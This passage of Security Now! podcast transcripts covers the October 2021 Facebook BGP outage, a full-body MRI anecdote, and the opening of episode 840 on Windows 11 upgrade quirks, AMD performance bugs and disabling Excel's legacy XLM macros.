Now, I know this is actually a very real concern.  I manage GRC's network at Level 3 remotely, and I sometimes need to alter the operation of the equipment that manages GRC's border with the Internet.  My own management traffic is crossing that same boundary as the one I'm managing, and I want my own management traffic to be crossing that same boundary since it's a security boundary, and my management traffic needs to be highly secured.  But that also means that I need to be very careful not to edit some rule that locks me out.  And it has happened, which necessitated a drive over to the physical plant to log onto the machine directly and correct a mistake.



During all this, a New York Times reporter tweeted:  "Was just on the phone with someone who works for Facebook who described employees unable to enter buildings this morning to begin to evaluate extent of outage because their badges weren't working to access doors."  So apparently everything at Facebook is IoT, baby, on the Internet and dependent upon some super-secure access control server somewhere else which cannot be reached during the routing outage.



After some additional digging, my next tweet was:  "Reports are that Facebook employees cannot enter their headquarters because their badges don't work, and those inside are unable to enter various rooms because access is dependent upon obtaining authorization from remote Facebook authentication servers."  Those who live by technology, dot dot dot.



And in light of all the recent news about Facebook's internal awareness that an obsession with Instagram postings may not be good for many of the youngsters who have flocked to it, I added a tongue-in-cheek tweet:  "Meanwhile, there's been a noted global decrease in reports of teenage depression and poor self-image.  Mental health is on the rise.  But fear not, BGP is sure to be restored soon."



And finally, to top it all off, five and a half years ago, back in April of 2016, Facebook acquired the domain registrar RegistrarSEC.com.  Ever since then, they've been their own domain registrar.  Because why not?  But what happens when Facebook's own domain registrar goes offline due to a routing outage?  Thanks to the automated systems being used by some less clued-in registrars, which are continually searching the Internet for previously registered domains which appear to be expired, abandoned, or recently vacated, yesterday - and I kid you not - several different registrars were listing the domain Facebook.com as being available for sale.



LEO:  I'll take it.



STEVE:  I grabbed a screenshot of one of those several for the show notes.  It announced with an exclamation point that "Facebook.com" is for sale!



LEO:  Wow.



STEVE:  Something went wrong, indeed.



LEO:  Probably those are automated systems that monitor for this kind of thing, sniping these things.



STEVE:  Yup.  Yup.



LEO:  So Facebook today published more details about the outage.



STEVE:  Good.



LEO:  And I think this actually sounds very credible as to what happened.  This is from Santosh Janardhan.  "Now that our platforms are up and running as usual after yesterday's outage, I thought it would be worth sharing a little more detail on what happened and why and, most importantly, how we're learning for it.  The outage was triggered by a system that manages" - and you were right, it's load balancing - "our global backbone network capacity."  Now, he does a lot of explanation about how DNS works and stuff, so I'll skip over that.  I think we all know that.



"So when you open one of our apps, the app's request for data travels to the nearest data center, which then communicates directly over our backbone network to a larger data center.  The data traffic between all these facilities is managed by routers."  Of course.  "In the extensive day-to-day work of maintaining this infrastructure, our engineers often need to take part of the backbone offline for maintenance  perhaps to repair a fiber line, add more capacity, et cetera."  Or updating the software on the router itself.



"This was the source of yesterday's outage.  During one of these routine maintenance jobs, a command was issued with the intention to assess the availability of global backbone capacity."  And you can probably understand better between the lines what kind of command that was.  "It unintentionally took down all the connections in our backbone network, effectively disconnecting Facebook data centers globally."  They took down their own backbone.  "Our systems are designed to audit commands like these to prevent mistakes like this."  I would hope so.



STEVE:  Yes.



LEO:  "But a bug in that audit tool" - a bug - "prevented it from properly stopping the command.  So this change caused a complete disconnection of our server connections between our data centers and the Internet.  And then that caused a second issue" - this is the thing you saw and everybody else saw - "that made things worse.  One of the jobs performed by our smaller facilities is to respond to DNS queries."



Oh.  This is interesting, too.  "To ensure reliable operation, our DNS servers disable BGP advertisements if they themselves cannot speak to the data centers, since this is an indication of an unhealthy network connection.  Because the backbone was removed from the operation, these locations declared themselves unhealthy and withdrew the BGP advertisements."  So they stopped saying, "We're here, we're routing."  "The end result was our DNS servers became unreachable even though they were still operational."  And then, well, you saw the consequence.



And of course the reason it took so long:  "Our engineers worked to figure out what was happening and why.  They faced two large obstacles.  First, it was not possible to access our data centers through normal means because the networks were down.  And second, the total loss of DNS broke many of the internal tools we'd normally use to investigate and resolve outages like this.  So we sent engineers onsite."  But obviously these facilities are highly secure, hard to get into.  And even once you get into them, the hardware and routers are designed to be difficult to modify, even if you have physical access to them.



STEVE:  In other words, they're heavily protected.



LEO:  As they should be.  Right, yeah.



STEVE:  Yes.  Yes.



LEO:  So they were even protected from themselves, their own remediation efforts.  So, you know, you've got to read between the lines of what exactly...



STEVE:  Yeah.  He's putting a little more weight on DNS outage than I think is proper.  As we saw, clients will wait a week before they get upset.



LEO:  Yeah.  Once the backbone is down, you don't have any connection back to the home office.



STEVE:  Yes.  It was the fact that their routes got pulled.  Whatever this thing was, I mean, lord knows what kind of command would have...



LEO:  Well, it sounded like a diagnostic.



STEVE:  We're still not having the detail that would satisfy.



LEO:  Yeah, what tool?  What's the name of the tool and all that?  They may or may not reveal that.  Again, for security reasons.



STEVE:  They have no obligation to.  They're like, whoops, we're sorry.  Everything's good.  Move along.



LEO:  So there were two problems, one that they were testing the reliability of the backbone and inadvertently issued a command that brought the backbone down.  And then the tool that was to protect that...



STEVE:  Well, Leo, that made the reliability test really easy.



LEO:  It's off.



STEVE:  Zero.



LEO:  Zero.



STEVE:  Zero. 



LEO:  But the tool that was to protect from this kind - and this is always my question when you get BGP routing tables screwed up, is wouldn't you test that?  Wouldn't you have some software that could - and we even advertise software that will assess the change and see what will happen without actually implementing it.  Apparently they had a tool like that, that had a bug and failed.  So it's interesting.



STEVE:  Yeah.  It's still, you know, it's murky enough as not to be...



LEO:  There's more, more to this story.



STEVE:  Yes.



LEO:  But it kind of makes sense.  And you could see how it's a cascade of failures.  We knew that must be; right?  And it was just, you know, it was a normal maintenance procedure that went wrong.  You can imagine, though, the engineer that pushed that test out, and then all of a sudden all routes...



STEVE:  The world ends.



LEO:  All the backbones are down.  Oh, my god.  The freak-out that must have been.



STEVE:  Yeah.



LEO:  Somebody's saying, well, they had a thing that said, "Are you sure you want to run this command?  Y or N?"



STEVE:  Are you really, really sure?  Double all the routes.



LEO:  Are you sure?  "Our engineers often need to take part of the backbone offline for maintenance."  This was the source of yesterday's outage.  "A command was issued with the intention to assess the availability of global backbone capacity."



STEVE:  Yeah.



LEO:  What could that be?



STEVE:  Yeah.  I mean, for example, if you were to unroute a network segment, then you might run traffic through it in order to check that network segment.  So you wouldn't have traffic going across the segment while you were using it, you know, while it was under test.  So that would mean that you would put in some commands to route around that segment that was down for testing.  And he put in a *.* when he didn't intend to.



LEO:  I do know that there are now three openings on the same post for software engineer routing and data path.



STEVE:  You know, and the fact, is with Facebook being as big as they are?



LEO:  Oh, man.



STEVE:  They have to be a little obtuse, I mean, for security reasons.  They can't really tell us what it was because if they gave us a recipe for taking Facebook off the air, then that's information that nobody should have.



LEO:  Yeah.  Nobody needs to know those tools.  Many of them are probably custom-built inside Facebook.



STEVE:  Actually, Facebook built their own entire stack.



LEO:  That's right.



STEVE:  All of their software, all of their network software is from scratch.



LEO:  Right.  As is their hardware.  I mean, they created their own little modules and everything.  The thing that always blows my mind, whether it's Facebook or Google or Microsoft, 20-30 years ago we would never have contemplated the notion that there may be a network operation that serves three billion people daily.



STEVE:  I know.  



LEO:  Mind-boggling.  To go from zero to 60 over a decade, it's kind of incomprehensible.  So the fact that it works at all and is frankly as reliable as it is normally is kind of impressive.  When you go to Facebook, it pops up.  Those images load almost instantly.  It's amazing.



STEVE:  And I feel the same way about the human body.  Someone says, oh, something's broke and doesn't work, I say, "It's amazing it works at all.  Are you kidding me?"



LEO:  Well, actually, and I've been meaning to tell you, given you're Mr. Quantified Self, you're I'm sure aware of the fact you can do these full-body MRIs.  



STEVE:  Yup.



LEO:  Lisa and I recently did this from a company Kevin Rose had recommended to us, they're out of British Columbia, called Prenoveau.



STEVE:  Yup.



LEO:  Are you familiar with Prenoveau?  Have you heard that name?



STEVE:  Well, I heard you talk about it.



LEO:  Oh, you heard us talk about it.  



STEVE:  And I immediately jumped online to see.  And unfortunately the closest one is Silicon Valley.



LEO:  That's what I was saying.  Next time you come up to Redwood City, let us know.  It's expensive.  And there are two negatives to this.  One is 2,500 bucks.  And they take - by the way, it's an hour procedure because they take many more pictures than a normal MRI would.  They're getting exposures from every angle and in many different ways.  So it's expensive, and it's a long procedure.



The other downside to it, which doctors are always bringing up, is the human body is not perfect.  We know that on the outside we're not perfect.  Well, you know, you're not perfect on the inside, either.  And you're going to find out about all sorts of things you didn't know.  And probably most of those you'd live your entire life without knowing or caring, and it wouldn't make any difference.  And the trick with this is to know, well, that's something, that's actionable.  Or that's just, you know, you're not perfect.  I have apparently an atrophied kidney.  Could have been congenital.  I will never know because this is the first time I've done this.



STEVE:  Right.



LEO:  And that's why you have two; right?  There's no blood test or anything that's shown any problems.  Should I be concerned about it?  Well, I am, kind of.  I mean, that's not a good thing.  But on the other hand, it probably has been there my whole life, and who knows, and who cares?  Right?



STEVE:  Well, what I like about that is it being an MRI rather than a CAT scan.



LEO:  It's safe.



STEVE:  It's not, yes, it's non-radiation, so you're not increasing your radiation load.  So it has that going for it.  And frankly, if there was one in my neighborhood, I'd seriously consider it.  And I would keep Lorrie away from it because oh, my god...



LEO:  You mean from your scan.  You wouldn't want her to see your scan.



STEVE:  She worries about whether the sun is going to come up in the morning.



LEO:  Oh, I know, I know, I know.



STEVE:  And it's like, oh, that would not be a good - that would not be a good thing.



LEO:  Well, Lisa and I are very glad we did it.  I won't go into the details.  I've already shared too much.  But we're glad we did it.  And we will now, now that we have a baseline, I think we will do it every 18 months.



STEVE:  Yeah.



LEO:  Because now you know.  I wish I'd done this when I was 25 because then I would know, well, this is where you're starting.  And it's the changes you want to look for.  So I think it's very interesting.  And I know you're Mr. Quantified Self, so you should do it.



STEVE:  Oh, but I do carotid ultrasounds every couple of years.



LEO:  That's right, I remember that, yeah.  Same reason.



STEVE:  Yes, because it's a very good proxy for your cardiac arteries.  And so if you see excessive plaque building up, it's a clue to not wait until a piece of it flakes off or a major artery clogs all the way or something.



LEO:  I'm happy to say, and I don't know if this would do as well as that, but no heart disease, no cancer.  So, I mean, that's important.  I'm glad.  That's the main reason I did it.



STEVE:  I think that's very cool.



LEO:  Yeah.  Somebody I'll show you my pictures.  Steve Gibson is at GRC.com.  That is the place to get his unique versions of this show.  He has a 16Kb audio version which sounds like Thomas Edison recorded it in his lab.  But it is small.  "Mary had a little lamb."  But it's small, and that's the reason we do that, so those of you who have limited bandwidth or metered bandwidth, that's a good way to get the audio.  He also has a transcript, which is even smaller.  That's really, really great.  You can read along as you listen, or use it to search for parts of the show.  It's on Google, so it's indexed.  So that's really great.  Elaine Farris writes those for us.  He also has 64Kb audio.



All of this is at GRC.com.  And while you're there, by all means this is a good time to pick up a copy of the world's best mass storage recovery and maintenance utility, SpinRite, currently 6.0.  6.1 is, as you heard, in very active development.  You'll get to participate in that, and you'll get a copy of 6.1 automatically for free if you buy 6.0 now.  So GRC.com.  Lots of other great free resources there, including his DNS Benchmark, which I used the other day to figure out who I should use for DNS, that kind of thing.



We have copies of the show at our website, TWiT.tv/sn.  There's a YouTube channel.  You can go there.  We have video there and on our site.  And of course you can subscribe.  In fact, I encourage you to subscribe in your favorite podcast client.  That way you don't even have to think about it.  You just have it whenever you're in the mood to listen.  If you do, if your client does allow reviews, please leave us a five-star review just so others know about this really phenomenal resource.



Steve will be the guest of an AMA on Friday as part of our Club TWiT.  I'm very excited about this.  This is brilliant.  Ant Pruitt, who is now our community manager, we said, "Ant, we need to - we really want to grow the club."  He said, "I'm going to help, and we're going to bring in Steve because I know people want to ask him questions."  So I'm surprised, I thought you - I didn't think you'd do that.  That's good.



STEVE:  I'll support the Club.



LEO:  Thank you.  We do this show every Tuesday right after MacBreak Weekly, usually between 1:30 and 2:00 p.m. Pacific.  That's 4:30 and 5:00 p.m. Eastern Time, 20:30 UTC.  The livestreams are at TWiT.tv/live.  There's audio and video there.  The chat room is irc.twit.tv.  The Discord is also open for chat during all of our shows.  And we even have forums.  The TWiT community is at twit.community, and the Mastodon instance, our social kind of Twitter alike, our Fediverse, is at twit.social - twit.community, twit.social.  You're welcome to join up there.  Those are free, as well.  Steve, have a great week.  I'll be watching in the "Invasion," too.  Cross my fingers.



STEVE:  Yes, yes.



LEO:  We'll see you next time on Security Now!.



STEVE:  Okay, buddy.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#840

DATE:		October 12, 2021

TITLE:		0-Day Angst 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-840.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at Microsoft's decision to finally disable Excel's legacy XLM by default, but not for everyone.  We look at Google's warning sent to more than 14,000 of its Gmail users and at their move toward enforced two-step verification.  We look at recent hacking and ransom payment legislation and at last week's massive breach at Twitch.  We cover the emergency Apache web server update and the mass exodus from WhatsApp during last week's Facebook outage.  We look at new Windows 11 side effects and at Patch Tuesday.  We close the loop with some listeners, and I quickly update on SpinRite's progress.  Then we settle down to consider the true significance and import of the various year-to-date zero-day counts.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  It's Patch Tuesday.  Steve will have the details, including why you might want to disable macros in Excel.  That again?  We'll also talk about, get Steve's take on the big Twitch hack.  And zero-days, Apple is not exempt.  You'll be surprised how many they've had this year alone.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 840, recorded Tuesday, October 12th, 2021:  0-Day Angst.



It's time for Security Now!, the show with Steve Gibson, the man in charge, the explainer in chief; the show that protects you, your loved ones online, your privacy and security.  Good day, Steve.  Good to see you.



STEVE GIBSON:  Hello, Leo.



LEO:  You did a great job, and everybody should listen to your Fireside Chat on Friday.  Thank you for doing that.  I really appreciate it.



STEVE:  I was happy to.  It was fun.  Gave me an opportunity to air some of my past.



LEO:  War stories.



STEVE:  My war stories from the past, yeah.



LEO:  Fantastic.  And if you are a member of Club TWiT, it's on your TWiT+ feed.  Big show today?



STEVE:  Yeah.  This started out as a discussion of another company's run of zero-days.  And as I sort of was fleshing it out more, I'm getting a little more philosophical about, you know, are we really needing to be that worried about them?  I thought, you know, this - and I didn't already have like a dominating topic.  We've got lots of news to talk about, so a jam-packed show.  But this is Security Now! #840 for October 12th.  And I titled it "0-Day Angst" to sort of just get a little philosophical after we cover the background facts about what it means, the whole issue of exploits that are found in the wild and how much danger they really represent to typical people.



But we're going to first look at Microsoft's decision to finally disable Excel's legacy XLM macros by default.  But not for everyone.  We look at Google's warning sent to more than 14,000 of their Gmail users.  And also at their move toward enforcing two-step verification.  We talked about this back in May when they said, we're going to make everybody use multiple factors of authentication.  To which I said, eh, good luck with that.



LEO:  Yeah.  I already got a call on the radio show from somebody baffled by the whole thing. 



STEVE:  Oh, goodness.  What could possibly go wrong?



LEO:  Oh, god.



STEVE:  We're going to look at recent hacking and ransom payment legislation which is, like, moving through Congress with surprising alacrity; and at last week's massive breach of Twitch.  We cover the emergency Apache web server update and the mass exodus from WhatsApp during last week's Facebook outage.  We look at new Windows 11 side effects.  And of course this is Patch Tuesday, which we don't have anything to say about yet because the action all begins now, and we'll be talking about it next week.



We close the loop with some listeners, and I quickly update on SpinRite's progress.  Then we're going to settle down to consider the true significance and import of the various year-to-date zero-day counts, what they mean for us.  And of course we have a fun - actually, we talked about this briefly in passing previously.  But I decided, okay, now's the time to deploy this fun Picture of the Week.  So I think a great podcast.



LEO:  Oh, I'm excited.  Back to you and your magic Picture of the Week.



STEVE:  So anyway, this was just one of, as we were saying, one of the synthetic O'Reilly covers.  This book, if it were real, titled "Web Development With Assembly," as in assembly language.  And then sort of the subtitle they have actually above that on the book, it says:  "You might as well just kill yourself right now."



LEO:  Oh, my god. 



STEVE:  And you know how all the O'Reilly books have an animal of some sort.  This thing is some synthetic disaster.



LEO:  Gryphon or something, yeah.



STEVE:  It's something with a forked tail, and the hind end of a tiger, and the front end of, I don't know, kind of a medusa, but with dreadlocks or something.  I don't know.  Anyway, quite frightening.  And of course it's written by, it says down in the lower right, Bob Johnson with His Therapist.



LEO:  Drive yourself nuts with Web Assembly.



STEVE:  That's right.  And of course I'm sure I'm not the only person who's ever written extensive web server side technology in assembly.



LEO:  You have?



STEVE:  Oh, yeah.



LEO:  Oh, my god.



STEVE:  All of mine is written in assembler.



LEO:  Oh, my god.



STEVE:  ShieldsUP! and the DNS Spoofability Test.  The Certificate Fingerprint stuff.  All of the GRC services are in assembler.



LEO:  Wow.  I didn't know that.  I assumed you use some web-facing technologies.  Wow.



STEVE:  No.



LEO:  You're brave.  Brave man.  It's running on IIS, so you know it's an Intel processor.  So you know it doesn't need to be portable, in other words.



STEVE:  Correct.  And just like me, it will never port.  It will...



LEO:  x86 forever.



STEVE:  That's right.  I'll go down with the Intel ship.  But it looks like that's not going to happen immediately, so...



LEO:  You've got plenty of time.  I think you're good.



STEVE:  We did, toward the end of the AMA with Ant, someone asked something about language, my favorite language or least favorite language.  It was something about got me on the topic of language.  And so I had a little bit of an opportunity to  sort of put RISC and CISC in context.  And maybe it was my least favorite processor.  I don't remember what it was.  But anyway, I was able to - I did spend a little time talking about how, in the case of the DEC minicomputers, like the PDP-11 and the VAX, which was sort of their ultimate instruction set design.  It was almost like writing in a high-level language.  I mean, unlike a RISC, which is so painful even I won't program that in assembly language, the complex instruction set computers were really pleasant to program in assembly language.  And that's what I'm doing with the x86 for as long as it lasts.



Okay.  So we have a new section, we'll see how long the section supports itself on the podcast, titled "Windows 11 Watch."  The first item got a lot of retweets and hearts or likes or whatever you call them under Twitter, when I tweeted this yesterday.  It is the name of a registry entry named, believe it or not,  officially supported by Microsoft:  "AllowUpgradesWithUnsupportedTPMOrCPU."  It's actually the name of a registry whose purpose is made quite clear by its name.  And it does, indeed, do what we would think.



So at HKEY_LOCAL_MACHINE\SYSTEM\Setup\MoSetup, believe it or not, M-O-S-E-T-U-P.  That's a registry key which already exists.  On my Win10 machine I had two subkeys below it.  But at that key, MoSetup, you create a "REG_DWORD" value named "AllowUpgradesWithUnsupportedTPMOrCPU."  You set it to "1" and reboot so that the change takes effect.  With that registry value set, as you would expect, Windows 11 setup will upgrade even over a TPM 1.2, you do still need to have at least 1.2, and without being blocked by what is otherwise a perfectly fine CPU version.  It's like, wow.  I mean, there are so many hacks emerging, you know, like third-party scripts and weird ways to get around what is clearly an arbitrary restriction because, after all, you set the registry key, and it says, oh, never mind.  Fine.  We'll run Windows 11 on this.



Our friend Simon Zerafa, after I tweeted that yesterday, he replied:  "Yes, but not receiving security updates will be an issue.  Probably best to avoid Windows 11 until the dust settles???????"  With, let's see, seven question marks.  Okay.  So first of all, I agree that Windows 11 is best avoided.  We'll be looking at a few additional reasons why in a moment.  But in reply to Simon's note about security updates, which Microsoft now says such systems may not receive, I tweeted in reply:  "Simon.  The Win11 requirements were always complete B.S.  They tried to make a power play.  It failed.  And just as that collapsed, there's no reason to think that such systems will not actually receive all security updates.  Microsoft just wants to keep pushing back.  But they lost this round."



And really, what possible value can it be to Microsoft, after creating an explicit registry entry called "AllowUpgradesWithUnsupportedTPMOrCPU," to then stubbornly refuse to provide those machines with security updates?  That would be nuts.  I mean, Windows 11 is already broken.  It was born broken.  So, you know, they're not going to ever fix it for people who install it?  That's crazy.



So today is Patch Tuesday.  It's probably too soon to know whether those systems which were upgraded over Microsoft's recently and decreasingly strong objections will receive updates.  I mean, actually there's one that they were supposed to be receiving today.  We'll see.  But we'll certainly know next month since by then many unqualifying, that is, like strictly unqualifying Windows 10 machines will have been gently nudged over to Windows 11 by their users, who are willing to set that key or do any of the other number of things that you can do now to get Windows 11 running on a Win10 machine.  We'll find out a month from now if they're going to get what is I'm sure going to be an exciting Patch Tuesday event.  So stay tuned.



I also got a kick out of another reply.  Bruno Zuber, who, Leo, his Twitter handle is @bzu.  So I thought, wow.  That's one of...



LEO:  That's a good one, yeah.



STEVE:  That's a good one.  He joined in December of '08.  So, you know...



LEO:  That's why, yeah.



STEVE:  Yeah.  He was on there earlier.  Anyway, he tweeted, I love this:  "Steve, 2015:  Never10.  Steve, 2021:  How to upgrade to Win 11, even if your hardware is not supported."



LEO:  He does have a point there.  He has a point.



STEVE:  Yes, he does.  I said: "Touch."  So, you know, just for the record, I guess, I mean, this caused me to do some introspection.  What is it?  Well, it's that I'm annoyed by anyone being, like technology being abused against us.  I was annoyed when Microsoft was trying to force Windows 7 users to use 10, even if they were quite happy with Windows 7.  And I'm also annoyed if Microsoft makes an entirely arbitrary decision not to allow people who can clearly use Windows 11 with no problem at all, not to.  So it's just, you know, that's the thing that bugs me.



So I use Windows 7 through every morning and early afternoon at my primary workspace.  I'm sitting in front of it right now.  But my microphone and earphones which I'm using right now are connected to a tiny little Win10 machine, which I use for connecting to TWiT.  I also sit in front of a Win10 machine on that Intel NUC, the one with the wide curved screen, every evening, I talked about.  And furthermore, any new machine I set up would be Windows 10.  And now I suppose, yes, it would be Windows 11.  You know, Microsoft's going to do what Microsoft's going to do.  I harbor no illusions about anyone's ability to affect their actions.



But again, I think it's about giving users choice.  And fussing around with an operating system is an entirely reasonable preoccupation.  I've spent, and I know you have, Leo, untold hours fussing with various operating system platforms through the decades.  It's something that geeks and nerds like to do.  But Simon's also right that depending upon how much time one enjoys spending fighting with the system's default settings, and with the possibility of new incompatibilities, it probably would be far saner to wait a bit.



And to that end, speaking of Windows 11 incompatibilities, Joel over at ExtremeTech wrote:  "If you're contemplating upgrading to Windows 11 on an AMD system, you may want to hold off just a bit.  The semiconductor design firm," meaning AMD, he wrote, "has confirmed that Windows 11 performance is a bit lower on Ryzen CPUs than under Windows 10 right now."



AMD posted a support knowledge base FAQ, it's number PA-400, titled "AMD processors running some apps up to 15% slower."  They note that even though 175 different processors which Microsoft says Windows 11 installs on run just great, and the idea that they even have 175 different processors is something of a question mark in my mind, due to an unspecified problem with AMD's L3 caching:  "Measured and functional L3 cache latency may increase by on the order of factor of three."



So in their notice under "Impact" they said:  "Applications sensitive to memory subsystem access may be impacted.  And expected performance impact of 3-5% in affected applications, 10-15% outliers possible in games commonly used for eSports."  And in addition to that, AMD said that something known as "UEFI CPPC2," which is the support for their so-called "preferred core," may not preferentially schedule threads on a processor's fastest core.  When I encountered this I wasn't aware that not all cores on big AMD desktop machines are created the same.  You know, Intel's are symmetrical, but apparently not all of AMD's are.  And I hear you guys over on MacBreak Weekly talking about, you know, Apple's performance cores versus their, what's the alternative...



LEO:  Efficiency.



STEVE:  Efficiency, right.  Their efficiency cores.  And I get it.  That absolutely makes sense on a battery-operated platform to be able to run, like keep the system alive using cores that are substantially more efficient and consuming less power, and only fire up the thing that heats the thing up in your hand when you absolutely need that performance.  Anyway, to address both these issues, AMD has said that updates to Windows and unspecified software are in development, probably maybe some UEFI updates to fix that, to address this issue with expected availability in October of 2021.  And that's one of the changes that I referred to as, like, apparently was going to be part of today's Patch Tuesday.  So although maybe that's on all of AMD's processors which did have Microsoft's blessing.  



Anyway, at ExtremeTech, Joel concluded his treatment of this by noting, he said:  "There's no firm timeline on when fixes will be available for either bug, but AMD is promising they'll be ready this month.  This issue is separate from the performance-impacting security features that are baked into Windows 11, which impact AMD Zen performance by 4-5% if left enabled on an OEM system or turned on by an enthusiast."  He said:  "While these two issues are unrelated, the net effect of them knocks most of a generation's worth of improvement off AMD's CPU cores."  That is to say, if you run Windows 11, AMD Zen performance?  You fall back a generation.



He said:  "Enthusiasts will want to be careful when using OEM PCs, both as far as driver updates and underlying security configurations are concerned.  At the same time," he said, "it's not unusual for a brand new OS to have some teething problems.  So this isn't likely to represent some kind of long-term referendum on Windows 11's gaming performance.  As we've covered," he wrote, "Windows 11 is a bit more 'meh' than some of Microsoft's previous releases.  Gamers don't need to be in any hurry to jump for the new OS.  And while there's no reason to specifically downgrade to Windows 10, there's no great reason to upgrade to Windows 11, either."  And of course that summarizes our position.  So thanks, Joel, for the AMD gamer's perspective on Win11.



Also, the Windows 10 taskbar is appearing on Windows 11.  New Windows 11 users are reporting that after upgrading over Windows 10, their Windows 11 retained the old Start Menu and that there was no Windows Store.  It had disappeared.  An active thread over on Reddit suggests rerunning a full Windows 11 reinstall, like on top of what you already have now, or creating a new user and deleting the old user.  It appears that something about user profiles are getting messed up in the conversion.  So abandoning the old profile that was imported from Windows 10 and restarting with a new profile under Windows 11 appears to resolve the trouble.  Unfortunately, all prior user settings, which can be many, I'm often jarred when I'll create a new user.  It's like, oh, my goodness, I'm back to new install look, you know, because I've made so many changes over time.



Anyway, all prior user settings and some apps may also need to be restored and reinstalled.  The earlier releases of Windows 11 also exhibited this behavior, so it's been seen before by those who enjoy playing with their environment for its own sake. And, again, no idea when this will be resolved.



Microsoft is disagreeing with themselves in some instances.  When performing the upgrade, some users are stopped with the message "This PC doesn't currently meet all the system requirements for Windows 11," even when their hardware is compatible, and Windows 10 setup agreed to go along with it.  And what makes this more confounding was when those users run the latest PC Health Check app, they are told that their hardware is compatible and will work without trouble with Windows 11.  So who knows what's going on?



We have an update on the Windows Explorer RAM leak I mentioned previously.  As we know, ever since the release of Windows 11 previews, File Explorer has been experiencing a memory leak causing the application to use too much system memory.  For some, the leak has caused File Explorer to use 1GB of memory after opening several folders.  And as I previously noted, after File Explorer is closed, that memory is not released back to the system.  It remains unavailable until Windows 11 is restarted.  The good news is that Microsoft found and fixed the issue in Windows 11 22454 preview build for the Insider dev channel.  It's not known when it will be made widely public, but presumably with updates next month.



Also, VirtualBox and Windows Hypervisors do not get along.  At the moment, Hyper-V, Windows Hypervisor, and VirtualBox are mutually incompatible.  So Windows 11 setup won't agree to set up until they're removed.  Oracle and Microsoft are working to get that fixed.



And lastly, there are dropped UDP packets occurring if third-party network optimization is in place.  Intel produces something called "Killer," which made me think that naming my Portable Dog Killer that wasn't really such a bad idea.



LEO:  No.  It's the worst name.  It's Killer WiFi.  I have it on a couple of my machines.  I hate it.  It's just a terrible name.



STEVE:  Yeah, it is a bad name.  Dell calls their similar offering "SmartByte," which seems a lot better.  Both of those are attempts to optimize network throughput by prioritizing network packet flow.  So they're a sort of automatic Quality of Service kind of a shoehorn on the system.  The trouble is, for some reason, when they are prioritizing UDP packets under Windows 11, those packets get dropped, lost and forgotten.  It's on Microsoft's list of known problems with Windows 11, and it's expected to be fixed, oh, in today's Patch Tuesday.  So maybe if we have some listeners who previously broke the rules and installed 11 on a machine where Microsoft said "No no no," and then later said, "Well, maybe," it would be interesting to know whether this is among the things that are known to be fixed, and if those machines get them.



Just, again, I can't imagine that Microsoft is going to produce what is by any definition a half-baked, you know, soggy Windows 11, and then make it possible for, I mean, they've documented this value, this registry value, by the way.  I don't know if I made that clear.  It's on Microsoft's official pages that, okay, if you want to do it anyway, fine.  And then not fix it?  It's just not conceivable.  I mean, you know, could happen, but really.



So today's Patch Tuesday.  We've entered into an era where we're going to be watching now two versions of Windows being fixed on the fly.  Apparently today there will already be patches for the Windows 11 released last week.  Since nothing really changes, as we know, under the covers from one Windows release to the next  and of course remember that's why most of the troubles historically that once affected Windows 7 and 8.1 and 10, well, okay.  The only reason that's true is it was all the same code; right?  So now with Windows 7 only being still supported for organizations who pay, we'll have updates which broadly affect 8.1 and 10 and 11, with a bunch of extras for 11 only, due to the fact that Microsoft, as I keep saying, clearly shipped Windows 11 well before it was ready for release.  Next week we'll take a look at what happened.



Okay.  So rather than the tyranny of the default, we have the joy of the new default:  Excel 4.0 macros finally to be disabled.  Kinda.  For years, ever since Excel 4 introduced macros known as XLMs, Excel macros, they have been one of the most abused features of Microsoft's Office suite.  And, you know, that's saying something.  Excel macros have been a favorite of malicious campaigns including recently TrickBot, Qbot, Dridex, Zloader, and many more.  They were introduced nearly three decades ago, back in 1992, so 29 years ago, with the release of Excel 4.0.  These macros provide users with a means of executing commands from within Excel cells.  And yeah, you know, what could possibly go wrong?  And although these XLM-style macros were superseded long ago with the release of Excel 5 which introduced VBA, right, Visual Basic for Applications, naturally, to be backward compatible, support for XLM macros has remained in place to this day.



Now, talking out of both sides of their mouth, due to the continued known abuse of these XLM macros, while they have deliberately left XLM macros enabled, Microsoft has been recommending that users switch away from and disable this style of macro for years in favor of their newer and more secure VBA macros. And VBA macros actually do have the opportunity, at least, to be more secure since VBA macros have supported for quite a while the so-called AMSI, the Antimalware Scan Interface, which can be used by its formally supported API to allow security software to scan macros for malicious behavior.  After many, many years of dragging their feet, Microsoft just added support for AMSI scanning to XLM macros this last March.  But this was seen as much too little and much too late.



Microsoft may have finally been spurred to some action because of a huge relatively recent spike in XLM abuse which was first noted in early 2020. A number of security researchers noted the sudden and unexplainable increased attention that XLM macros had been getting from numerous top-tier bad guys, among those pieces of malware that I just referred to.  Reports from VMware, ReversingLabs, Lastline, MadLabs, Expel, Deep Instinct, and others observed a sharp spike in malware strains and threat actors abusing XLM macros for any purpose from cyberespionage to banking trojans, ransomware, and cryptocurrency theft.



Finally, this past summer, security researchers began loudly and publicly criticizing Microsoft for leaving users exposed to attacks, asking for more action from the Gods of Redmond, namely that XLM macros, again, long having been only of legacy value, should be disabled by default within Office applications.  In this way, the researchers have argued, the companies which actually still rely upon legacy XLM could selectively reenable it for their employees, while everyone else who is being actively abused by having XLM always enabled would then be, and would remain, protected from Excel documents containing malicious XLMs.



The logic, of course, of that is flawless.  But believe it or not, Microsoft will still not be disabling this massively abused 30-year-old technology by default for everyone.  They will, however, be disabling it now for their paying subscribers as part of the Microsoft 365 service.  So any enterprise admins listening to this podcast should know that Windows group policies can be used to disable this unneeded and unused macro capability to protect their users globally.



And non-enterprise users, end users, I use Office stuff offline, can do this for themselves by opening Excel and going to Excel Options, Trust Center, then click on the Trust Center Settings button and select Macro Settings on the left.  You'll see then a set of options which are very clear, and absolutely disable XLM macros.  Well, in fact, you're able to disable it and request a notification, which is probably what you want if you think there's any reason for macros to be tucked into cells of Excel objects.  And remember that it doesn't have to be an Excel spreadsheet.



